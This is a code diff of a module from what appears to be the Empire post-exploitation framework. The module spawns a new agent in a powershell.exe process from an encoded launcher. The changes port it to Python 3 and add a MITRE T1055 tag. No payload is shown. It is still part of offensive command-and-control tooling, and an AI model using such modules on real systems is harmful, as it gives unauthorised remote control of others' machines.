@@ -1,6 +1,8 @@
+from __future__ import print_function
+from builtins import object
 from lib.common import helpers
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -10,6 +12,10 @@ class Module:
             'Author': ['@harmj0y'],
 
             'Description': ('Spawns a new agent in a new powershell.exe process.'),
+
+            'Software': '',
+
+            'Techniques': ['T1055'],
 
             'Background' : False,
 
@@ -86,7 +92,7 @@ class Module:
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
 
         if launcher == "":
-            print helpers.color("[!] Error in launcher command generation.")
+            print(helpers.color("[!] Error in launcher command generation."))
             return ""
         else:
             # transform the backdoor into something launched by powershell.exe
